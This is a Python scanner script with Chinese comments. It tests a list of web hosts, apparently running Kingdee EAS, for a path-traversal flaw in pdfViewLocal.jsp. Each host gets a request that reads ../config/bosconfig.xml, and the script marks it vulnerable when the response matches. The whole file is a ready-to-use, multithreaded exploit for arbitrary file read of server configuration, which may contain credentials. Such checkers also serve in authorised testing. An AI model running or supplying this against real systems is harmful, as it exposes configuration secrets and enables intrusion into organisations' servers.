import argparse
from multiprocessing.dummy import Pool as ThreadPool
from urllib.parse import urlparse
import requests

requests.packages.urllib3.disable_warnings()

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False
def check_url(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }

    try:
        url_full = f"{url}/easweb/logout/../cp/dm/pdfViewLocal.jsp?path=../config/bosconfig.xml"
        r = requests.get(url=url_full, headers=headers, verify=False, timeout=5)
        if r.status_code == 200 and 'attribute' in r.text:
            print("[+]" + url_full + " is vulnerable")
        else:
            print("[-]" + url_full + " is not vulnerable")
    except Exception as e:
        print("[!]" + url + " encountered an error: " + str(e))


def main():
    parser = argparse.ArgumentParser(description='Check if URLs are vulnerable.')
    parser.add_argument('-f', '--file', type=str,
                        help='File containing a list of URLs (one URL per line)')
    parser.add_argument('-u', '--url', type=str,
                        help='Single URL to check')
    parser.add_argument('-t', '--threads', type=int, default=5,
                        help='Number of threads to use (default: 5)')

    args = parser.parse_args()

    urls = []

    # 从文件中读取网址
    if args.file:
        try:
            with open(args.file, 'r') as f:
                for line in f:
                    target = line.strip()
                    if is_valid_url(target):
                        urls.append(target)
                    else:
                        target = f"http://{target}"
                        if is_valid_url(target):
                            urls.append(target)
                        else:
                            print(f"[WARNING] 无效的URL: {line.strip()}")
        except FileNotFoundError:
            print("[ERROR] 文件未找到")
            return
        except Exception as e:
            print(f"[ERROR] 读取文件时出错: {e}")
            return

    # 添加单个网址
    if args.url:
        if is_valid_url(args.url):
            urls.append(args.url)

        else:
            target = f"http://{args.url}"
            if is_valid_url(target):
                urls.append(target)
            else:
                print("[ERROR] 无效的URL格式")
                return

    # 检查是否有网址需要检查
    if urls:
        with ThreadPool(args.threads) as pool:
            pool.map(check_url, urls)
    else:
        print("[!] No URLs provided to check.")


if __name__ == '__main__':
    main()
